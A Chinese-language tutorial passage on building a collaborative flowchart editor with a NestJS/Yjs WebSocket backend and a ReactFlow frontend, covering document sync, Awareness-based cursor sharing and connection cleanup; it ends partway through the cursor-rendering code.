<p>让我们从后端开始，因为它是整个协同系统的中枢。后端的职责很清晰：接收客户端连接，转发同步消息，管理 Awareness 状态。</p>
<p>我们使用 NestJS 框架搭建后端服务，整个协同逻辑封装在一个 Service 中。首先创建项目结构：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa3cd33aa7b14500bfb572a4a2a3038d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768180447&amp;x-signature=jmWUatmz4U3gHsmGG9%2Bb%2FwHDYH0%3D" alt="20251231154346" loading="lazy"/></p>
<h3 data-id="heading-2">依赖安装</h3>
<p>在开始编写代码前，需要安装必要的依赖：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add yjs y-protocols ws lib0
pnpm add -D @types/ws
</code></pre>
<h3 data-id="heading-3">核心数据结构</h3>
<p>在 <code>src/yjs/yjs.service.ts</code> 文件中，首先导入需要的模块，然后定义 WSSharedDoc 类：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span>, <span class="hljs-title class_">OnModuleInit</span>, <span class="hljs-title class_">Logger</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@nestjs/common"</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">WebSocket</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"ws"</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> Y <span class="hljs-keyword">from</span> <span class="hljs-string">"yjs"</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> syncProtocol <span class="hljs-keyword">from</span> <span class="hljs-string">"y-protocols/sync"</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> awarenessProtocol <span class="hljs-keyword">from</span> <span class="hljs-string">"y-protocols/awareness"</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> encoding <span class="hljs-keyword">from</span> <span class="hljs-string">"lib0/encoding"</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> decoding <span class="hljs-keyword">from</span> <span class="hljs-string">"lib0/decoding"</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> map <span class="hljs-keyword">from</span> <span class="hljs-string">"lib0/map"</span>;

<span class="hljs-keyword">const</span> wsReadyStateOpen = <span class="hljs-number">1</span>;
<span class="hljs-keyword">const</span> messageSync = <span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> messageAwareness = <span class="hljs-number">1</span>;

<span class="hljs-keyword">const</span> <span class="hljs-attr">docs</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">WSSharedDoc</span>&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
</code></pre>
<p>这些导入包括：NestJS 的装饰器和日志工具，WebSocket 库用于建立连接，Yjs 核心库和协议库，lib0 提供的编解码和 Map 工具。常量定义了消息类型和连接状态。</p>
<p>WSSharedDoc 类继承自 Y.Doc，是服务端维护的共享文档：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WSSharedDoc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Y.Doc</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">conns</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">WebSocket</span>, <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">number</span>&gt;&gt;;
  <span class="hljs-attr">awareness</span>: awarenessProtocol.<span class="hljs-property">Awareness</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">super</span>({ <span class="hljs-attr">gc</span>: <span class="hljs-literal">true</span> });
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">conns</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">awareness</span> = <span class="hljs-keyword">new</span> awarenessProtocol.<span class="hljs-title class_">Awareness</span>(<span class="hljs-variable language_">this</span>);
  }
}
</code></pre>
<p>这个类扩展了 Yjs 文档，添加了连接管理和 Awareness 支持。<code>name</code> 是文档的唯一标识（通常是房间名），<code>conns</code> 维护了当前所有连接到这个文档的 WebSocket 客户端，<code>awareness</code> 用于同步用户的临时状态（如光标位置）。</p>
<p>在同一文件中，文档管理使用一个全局 Map，确保同一个房间的所有客户端共享同一个文档实例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-attr">docs</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">WSSharedDoc</span>&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-keyword">const</span> getYDoc = (<span class="hljs-attr">docname</span>: <span class="hljs-built_in">string</span>): <span class="hljs-function"><span class="hljs-params">WSSharedDoc</span> =&gt;</span>
  map.<span class="hljs-title function_">setIfUndefined</span>(docs, docname, <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WSSharedDoc</span>(docname));
</code></pre>
<h3 data-id="heading-4">处理客户端连接</h3>
<p>接下来在 YjsService 类中实现连接处理。当客户端连接时，我们需要建立 WebSocket 连接，从 URL 中提取房间名，然后设置消息处理逻辑：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">onModuleInit</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">wss</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>.<span class="hljs-title class_">Server</span>({ <span class="hljs-attr">port</span>: <span class="hljs-number">1234</span> });

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">wss</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'connection'</span>, <span class="hljs-function">(<span class="hljs-params">conn: WebSocket, req: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> url = req.<span class="hljs-property">url</span> || <span class="hljs-string">'/'</span>;
    <span class="hljs-keyword">const</span> docName = url.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">'?'</span>)[<span class="hljs-number">0</span>] || <span class="hljs-string">'default'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupWSConnection</span>(conn, docName);
  });

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'WebSocket server initialized on port 1234'</span>);
}
</code></pre>
<p>这里从请求 URL 中提取房间名，比如 <code>ws://localhost:1234/flow-room</code> 会提取出 <code>flow-room</code> 作为文档名称。这样不同的房间使用不同的文档，互不干扰。</p>
<h3 data-id="heading-5">消息处理</h3>
<p>setupWSConnection 是整个服务端的核心，它处理客户端的所有消息：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-title function_">setupWSConnection</span>(<span class="hljs-params">conn: WebSocket, docName: <span class="hljs-built_in">string</span></span>) {
  conn.<span class="hljs-property">binaryType</span> = <span class="hljs-string">'arraybuffer'</span>;
  <span class="hljs-keyword">const</span> doc = <span class="hljs-title function_">getYDoc</span>(docName);
  doc.<span class="hljs-property">conns</span>.<span class="hljs-title function_">set</span>(conn, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());

  conn.<span class="hljs-title function_">on</span>(<span class="hljs-string">'message'</span>, <span class="hljs-function">(<span class="hljs-params">message: <span class="hljs-built_in">ArrayBuffer</span> | Buffer</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> uint8Array = message <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ArrayBuffer</span>
      ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(message)
      : <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(message.<span class="hljs-property">buffer</span>, message.<span class="hljs-property">byteOffset</span>, message.<span class="hljs-property">byteLength</span>);

    <span class="hljs-keyword">const</span> encoder = encoding.<span class="hljs-title function_">createEncoder</span>();
    <span class="hljs-keyword">const</span> decoder = decoding.<span class="hljs-title function_">createDecoder</span>(uint8Array);
    <span class="hljs-keyword">const</span> messageType = decoding.<span class="hljs-title function_">readVarUint</span>(decoder);

    <span class="hljs-keyword">switch</span> (messageType) {
      <span class="hljs-keyword">case</span> <span class="hljs-attr">messageSync</span>:
        encoding.<span class="hljs-title function_">writeVarUint</span>(encoder, messageSync);
        syncProtocol.<span class="hljs-title function_">readSyncMessage</span>(decoder, encoder, doc, <span class="hljs-literal">null</span>);
        <span class="hljs-keyword">if</span> (encoding.<span class="hljs-title function_">length</span>(encoder) &gt; <span class="hljs-number">1</span>) {
          <span class="hljs-title function_">send</span>(doc, conn, encoding.<span class="hljs-title function_">toUint8Array</span>(encoder));
        }
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-attr">messageAwareness</span>:
        awarenessProtocol.<span class="hljs-title function_">applyAwarenessUpdate</span>(
          doc.<span class="hljs-property">awareness</span>,
          decoding.<span class="hljs-title function_">readVarUint8Array</span>(decoder),
          conn,
        );
        <span class="hljs-keyword">break</span>;
    }
  });
}
</code></pre>
<p>消息分为两种类型：Sync 消息用于同步文档数据（节点、连接等持久化数据），Awareness 消息用于同步用户状态（光标位置等临时数据）。服务端收到 Sync 消息后，使用 y-protocols 的 readSyncMessage 处理，如果有响应数据就发送回客户端。收到 Awareness 消息后，应用更新并广播给其他客户端。</p>
<h3 data-id="heading-6">初始同步和状态广播</h3>
<p>新客户端连接后，需要立即发送当前文档状态，让新用户能看到已有的内容：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setImmediate</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (conn.<span class="hljs-property">readyState</span> === wsReadyStateOpen) {
    <span class="hljs-keyword">const</span> encoder = encoding.<span class="hljs-title function_">createEncoder</span>();
    encoding.<span class="hljs-title function_">writeVarUint</span>(encoder, messageSync);
    syncProtocol.<span class="hljs-title function_">writeSyncStep1</span>(encoder, doc);
    <span class="hljs-title function_">send</span>(doc, conn, encoding.<span class="hljs-title function_">toUint8Array</span>(encoder));

    <span class="hljs-keyword">const</span> awarenessStates = doc.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">getStates</span>();
    <span class="hljs-keyword">if</span> (awarenessStates.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">const</span> awarenessEncoder = encoding.<span class="hljs-title function_">createEncoder</span>();
      encoding.<span class="hljs-title function_">writeVarUint</span>(awarenessEncoder, messageAwareness);
      encoding.<span class="hljs-title function_">writeVarUint8Array</span>(
        awarenessEncoder,
        awarenessProtocol.<span class="hljs-title function_">encodeAwarenessUpdate</span>(
          doc.<span class="hljs-property">awareness</span>,
          <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(awarenessStates.<span class="hljs-title function_">keys</span>())
        )
      );
      <span class="hljs-title function_">send</span>(doc, conn, encoding.<span class="hljs-title function_">toUint8Array</span>(awarenessEncoder));
    }
  }
});
</code></pre>
<p>使用 setImmediate 延迟发送，确保连接完全建立。首先发送 Sync Step1 消息，包含当前文档的完整状态向量，然后如果有其他用户在线，发送他们的 Awareness 状态，这样新用户能立即看到其他人的光标。</p>
<h3 data-id="heading-7">监听和广播更新</h3>
<p>服务端需要监听文档的更新，并将更新广播给所有连接的客户端：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">updateHandler</span> = (<span class="hljs-params">update: <span class="hljs-built_in">Uint8Array</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> encoder = encoding.<span class="hljs-title function_">createEncoder</span>();
  encoding.<span class="hljs-title function_">writeVarUint</span>(encoder, messageSync);
  syncProtocol.<span class="hljs-title function_">writeUpdate</span>(encoder, update);
  <span class="hljs-keyword">const</span> message = encoding.<span class="hljs-title function_">toUint8Array</span>(encoder);
  doc.<span class="hljs-property">conns</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">_, c</span>) =&gt;</span> <span class="hljs-title function_">send</span>(doc, c, message));
};
doc.<span class="hljs-title function_">on</span>(<span class="hljs-string">"update"</span>, updateHandler);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">awarenessChangeHandler</span> = (<span class="hljs-params">{ added, updated, removed }</span>) =&gt; {
  <span class="hljs-keyword">const</span> changedClients = added.<span class="hljs-title function_">concat</span>(updated, removed);
  <span class="hljs-keyword">const</span> connControlledIDs = doc.<span class="hljs-property">conns</span>.<span class="hljs-title function_">get</span>(conn);
  <span class="hljs-keyword">if</span> (connControlledIDs !== <span class="hljs-literal">undefined</span>) {
    added.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">clientID</span>) =&gt;</span> connControlledIDs.<span class="hljs-title function_">add</span>(clientID));
    removed.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">clientID</span>) =&gt;</span> connControlledIDs.<span class="hljs-title function_">delete</span>(clientID));
  }

  <span class="hljs-keyword">const</span> encoder = encoding.<span class="hljs-title function_">createEncoder</span>();
  encoding.<span class="hljs-title function_">writeVarUint</span>(encoder, messageAwareness);
  encoding.<span class="hljs-title function_">writeVarUint8Array</span>(
    encoder,
    awarenessProtocol.<span class="hljs-title function_">encodeAwarenessUpdate</span>(doc.<span class="hljs-property">awareness</span>, changedClients)
  );
  <span class="hljs-keyword">const</span> buff = encoding.<span class="hljs-title function_">toUint8Array</span>(encoder);
  doc.<span class="hljs-property">conns</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">_, c</span>) =&gt;</span> <span class="hljs-title function_">send</span>(doc, c, buff));
};
doc.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">"update"</span>, awarenessChangeHandler);
</code></pre>
<p>当文档有更新时（比如用户移动了节点），将增量更新编码后广播给所有客户端。当 Awareness 状态变化时（比如用户移动了光标），也广播给所有客户端。注意这里会追踪每个连接控制的客户端 ID，用于后续清理。</p>
<h3 data-id="heading-8">连接清理</h3>
<p>当客户端断开连接时，需要清理相关资源，移除其 Awareness 状态，如果房间空了就销毁文档：</p>
<pre><code class="hljs language-typescript" lang="typescript">conn.<span class="hljs-title function_">on</span>(<span class="hljs-string">"close"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> controlledIds = doc.<span class="hljs-property">conns</span>.<span class="hljs-title function_">get</span>(conn);
  doc.<span class="hljs-property">conns</span>.<span class="hljs-title function_">delete</span>(conn);
  doc.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">off</span>(<span class="hljs-string">"update"</span>, awarenessChangeHandler);
  doc.<span class="hljs-title function_">off</span>(<span class="hljs-string">"update"</span>, updateHandler);

  <span class="hljs-keyword">if</span> (controlledIds) {
    awarenessProtocol.<span class="hljs-title function_">removeAwarenessStates</span>(
      doc.<span class="hljs-property">awareness</span>,
      <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(controlledIds),
      <span class="hljs-literal">null</span>
    );
  }

  <span class="hljs-keyword">if</span> (doc.<span class="hljs-property">conns</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>) {
    doc.<span class="hljs-title function_">destroy</span>();
    docs.<span class="hljs-title function_">delete</span>(docName);
  }
});
</code></pre>
<p>这里移除事件监听器防止内存泄漏，清除该客户端的 Awareness 状态，如果是最后一个客户端离开，销毁文档释放内存。</p>
<p>这些逻辑都编写完成之后，我们就可以执行如下名来来启动项目：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm start:dev
</code></pre>
<h2 data-id="heading-9">前端实现</h2>
<p>前端的实现更加复杂一些，因为要处理用户交互、UI 渲染和协同同步。我们使用 ReactFlow 作为流程图渲染引擎，Yjs 处理数据同步。</p>
<p>前端项目结构如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97eeb33f55234f3c9b55d81e21e4d34e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768180447&amp;x-signature=3q3iqxGOViknDO7d8hsIhkxsfOw%3D" alt="20251231154502" loading="lazy"/></p>
<h3 data-id="heading-10">前端依赖安装</h3>
<p>前端需要安装以下依赖：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add yjs y-websocket reactflow
</code></pre>
<p>React Flow 是一个用于构建交互式图形和流程图的库，提供了丰富的功能，如拖拽节点、连接线、缩放、平移等，常用于可视化编辑器、流程设计器等应用中。它支持高度定制，可以很容易地与其他前端库和框架集成。</p>
<h3 data-id="heading-11">初始化协同环境</h3>
<p>在 <code>src/components/Canvas.tsx</code> 文件中，首先导入需要的库：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { useCallback, useEffect, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">ReactFlow</span>,
  <span class="hljs-title class_">Controls</span>,
  <span class="hljs-title class_">Background</span>,
  useNodesState,
  useEdgesState,
  addEdge,
  <span class="hljs-title class_">BackgroundVariant</span>,
  <span class="hljs-title class_">ConnectionMode</span>,
  useReactFlow,
  <span class="hljs-title class_">ReactFlowProvider</span>,
  <span class="hljs-keyword">type</span> <span class="hljs-title class_">Connection</span>,
  <span class="hljs-keyword">type</span> <span class="hljs-title class_">Edge</span>,
  <span class="hljs-keyword">type</span> <span class="hljs-title class_">Node</span>,
  <span class="hljs-title class_">NodeChange</span>,
  <span class="hljs-title class_">EdgeChange</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">"reactflow"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">"reactflow/dist/style.css"</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> Y <span class="hljs-keyword">from</span> <span class="hljs-string">"yjs"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WebsocketProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"y-websocket"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Cursor</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./Cursor"</span>;
</code></pre>
<p>然后在 Canvas 组件中创建 Yjs 文档和 WebSocket 连接：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> doc = <span class="hljs-keyword">new</span> Y.<span class="hljs-title class_">Doc</span>();
  <span class="hljs-keyword">const</span> wsProvider = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebsocketProvider</span>(
    <span class="hljs-string">"ws://localhost:1234"</span>,
    <span class="hljs-string">"flow-room"</span>,
    doc,
    {
      <span class="hljs-attr">connect</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">resyncInterval</span>: -<span class="hljs-number">1</span>,
    }
  );

  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    wsProvider.<span class="hljs-title function_">connect</span>();
  }, <span class="hljs-number">50</span>);

  <span class="hljs-keyword">const</span> nodesMap = doc.<span class="hljs-title function_">getMap</span>(<span class="hljs-string">"nodes"</span>);
  <span class="hljs-keyword">const</span> edgesMap = doc.<span class="hljs-title function_">getMap</span>(<span class="hljs-string">"edges"</span>);

  ydoc.<span class="hljs-property">current</span> = doc;
  provider.<span class="hljs-property">current</span> = wsProvider;

  <span class="hljs-comment">// ... 后续逻辑</span>
}, []);
</code></pre>
<p>这里延迟连接是为了避免过快重连的警告，使用 <code>resyncInterval: -1</code> 禁用自动重新同步。我们使用两个 Y.Map 分别存储节点和连接，这样可以独立管理它们的增删改。</p>
<h3 data-id="heading-12">初始化 Awareness</h3>
<p>在同一个 useEffect 中，设置本地用户的 Awareness 状态，包括随机生成的颜色和客户端 ID：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> clientId = wsProvider.<span class="hljs-property">awareness</span>.<span class="hljs-property">clientID</span>;
<span class="hljs-keyword">const</span> userColor = <span class="hljs-title function_">useRef</span>(<span class="hljs-title function_">generateRandomColor</span>());

wsProvider.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">setLocalState</span>({
  <span class="hljs-attr">cursor</span>: <span class="hljs-literal">null</span>,
  <span class="hljs-attr">color</span>: userColor.<span class="hljs-property">current</span>,
  <span class="hljs-attr">clientId</span>: clientId,
});

wsProvider.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">"change"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> states = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(wsProvider.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">getStates</span>());
  <span class="hljs-title function_">setCursors</span>(states);
});
</code></pre>
<p>监听 Awareness 变化，当其他用户的光标移动时，更新本地状态并重新渲染光标。</p>
<h3 data-id="heading-13">同步节点数据</h3>
<p>继续在 useEffect 中，如果是首次打开，初始化一些默认节点，然后监听节点变化，将 Yjs 数据同步到 React 状态：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">if</span> (nodesMap.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>) {
  initialNodes.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">node</span>) =&gt;</span> {
    nodesMap.<span class="hljs-title function_">set</span>(node.<span class="hljs-property">id</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(node)));
  });
}

nodesMap.<span class="hljs-title function_">observe</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> yNodes = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(nodesMap.<span class="hljs-title function_">values</span>());
  <span class="hljs-keyword">const</span> validNodes = yNodes.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">node</span>) =&gt;</span> ({
    <span class="hljs-attr">id</span>: node.<span class="hljs-property">id</span>,
    <span class="hljs-attr">type</span>: node.<span class="hljs-property">type</span> || <span class="hljs-string">"default"</span>,
    <span class="hljs-attr">data</span>: node.<span class="hljs-property">data</span>,
    <span class="hljs-attr">position</span>: {
      <span class="hljs-attr">x</span>: node.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>,
      <span class="hljs-attr">y</span>: node.<span class="hljs-property">position</span>.<span class="hljs-property">y</span>,
    },
  }));
  <span class="hljs-title function_">setNodes</span>(validNodes);
});
</code></pre>
<p>使用 <code>JSON.parse(JSON.stringify())</code> 确保存储的是纯数据对象，避免 Yjs 无法序列化 React 组件。observe 方法监听 Y.Map 的变化，任何修改都会触发回调，我们将 Yjs 数据转换为 ReactFlow 需要的格式。</p>
<h3 data-id="heading-14">处理节点拖动</h3>
<p>当用户拖动节点时，需要将位置更新同步到 Yjs 文档：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> handleNodesChange = <span class="hljs-title function_">useCallback</span>(
  <span class="hljs-function">(<span class="hljs-params">changes: NodeChange[]</span>) =&gt;</span> {
    <span class="hljs-title function_">onNodesChange</span>(changes);

    <span class="hljs-keyword">if</span> (!ydoc.<span class="hljs-property">current</span>) <span class="hljs-keyword">return</span>;

    changes.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">change</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (change.<span class="hljs-property">type</span> === <span class="hljs-string">"position"</span>) {
        <span class="hljs-keyword">const</span> node = nodes.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> n.<span class="hljs-property">id</span> === change.<span class="hljs-property">id</span>);
        <span class="hljs-keyword">if</span> (node) {
          <span class="hljs-keyword">const</span> updatedNode = {
            ...node,
            <span class="hljs-attr">position</span>: change.<span class="hljs-property">position</span> || node.<span class="hljs-property">position</span>,
          };
          ydoc.<span class="hljs-property">current</span>
            ?.<span class="hljs-title function_">getMap</span>(<span class="hljs-string">"nodes"</span>)
            .<span class="hljs-title function_">set</span>(change.<span class="hljs-property">id</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(updatedNode)));
        }
      }
    });
  },
  [nodes, onNodesChange]
);
</code></pre>
<p>ReactFlow 使用 changes 数组描述节点的变化，我们过滤出位置变化，更新到 Yjs 文档。这个更新会触发 observe 回调，同时通过 WebSocket 发送给其他客户端。</p>
<h3 data-id="heading-15">创建连接</h3>
<p>当用户连接两个节点时，创建一条边并同步到 Yjs：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> onConnect = <span class="hljs-title function_">useCallback</span>(
  <span class="hljs-function">(<span class="hljs-params">connection: Connection</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!connection.<span class="hljs-property">source</span> || !connection.<span class="hljs-property">target</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> newEdge = {
      <span class="hljs-attr">id</span>: <span class="hljs-string">`e<span class="hljs-subst">${connection.source}</span>-<span class="hljs-subst">${connection.target}</span>`</span>,
      <span class="hljs-attr">source</span>: connection.<span class="hljs-property">source</span>,
      <span class="hljs-attr">target</span>: connection.<span class="hljs-property">target</span>,
      <span class="hljs-attr">sourceHandle</span>: connection.<span class="hljs-property">sourceHandle</span> || <span class="hljs-literal">undefined</span>,
      <span class="hljs-attr">targetHandle</span>: connection.<span class="hljs-property">targetHandle</span> || <span class="hljs-literal">undefined</span>,
    };

    <span class="hljs-keyword">if</span> (ydoc.<span class="hljs-property">current</span>) {
      ydoc.<span class="hljs-property">current</span>.<span class="hljs-title function_">getMap</span>(<span class="hljs-string">"edges"</span>).<span class="hljs-title function_">set</span>(newEdge.<span class="hljs-property">id</span>, newEdge);
    }

    <span class="hljs-title function_">setEdges</span>(<span class="hljs-function">(<span class="hljs-params">eds</span>) =&gt;</span> <span class="hljs-title function_">addEdge</span>(connection, eds));
  },
  [setEdges]
);
</code></pre>
<p>生成唯一的边 ID，同时更新本地状态和 Yjs 文档。本地状态用于立即响应，Yjs 文档用于同步给其他客户端。</p>
<h3 data-id="heading-16">光标同步</h3>
<p>光标同步是协同编辑中很重要的用户体验细节，让用户能看到彼此的位置：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> handleMouseMove = <span class="hljs-title function_">useCallback</span>(
  <span class="hljs-function">(<span class="hljs-params">e: React.MouseEvent</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!provider.<span class="hljs-property">current</span>?.<span class="hljs-property">awareness</span> || !flowRef.<span class="hljs-property">current</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> bounds = flowRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> x = e.<span class="hljs-property">clientX</span> - bounds.<span class="hljs-property">left</span>;
    <span class="hljs-keyword">const</span> y = e.<span class="hljs-property">clientY</span> - bounds.<span class="hljs-property">top</span>;

    <span class="hljs-keyword">const</span> flowPosition = reactFlowInstance.<span class="hljs-title function_">screenToFlowPosition</span>({ x, y });

    provider.<span class="hljs-property">current</span>.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">setLocalState</span>({
      <span class="hljs-attr">cursor</span>: flowPosition,
      <span class="hljs-attr">color</span>: userColor.<span class="hljs-property">current</span>,
      <span class="hljs-attr">clientId</span>: provider.<span class="hljs-property">current</span>.<span class="hljs-property">awareness</span>.<span class="hljs-property">clientID</span>,
    });
  },
  [reactFlowInstance]
);

<span class="hljs-keyword">const</span> handleMouseLeave = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!provider.<span class="hljs-property">current</span>?.<span class="hljs-property">awareness</span>) <span class="hljs-keyword">return</span>;

  provider.<span class="hljs-property">current</span>.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">setLocalState</span>({
    <span class="hljs-attr">cursor</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-attr">color</span>: userColor.<span class="hljs-property">current</span>,
    <span class="hljs-attr">clientId</span>: provider.<span class="hljs-property">current</span>.<span class="hljs-property">awareness</span>.<span class="hljs-property">clientID</span>,
  });
}, []);
</code></pre>
<p>获取鼠标相对于容器的坐标，使用 ReactFlow 的 <code>screenToFlowPosition</code> 转换为画布坐标（考虑缩放和平移），然后更新到 Awareness。当鼠标离开画布时，将光标设置为 null，其他用户就看不到这个光标了。</p>
<h3 data-id="heading-17">渲染协同光标</h3>
<p>最后在 Canvas 组件的 JSX 中渲染其他用户的光标，使用不同颜色区分：</p>
<pre><code class="hljs language-typescript" lang="typescript">{
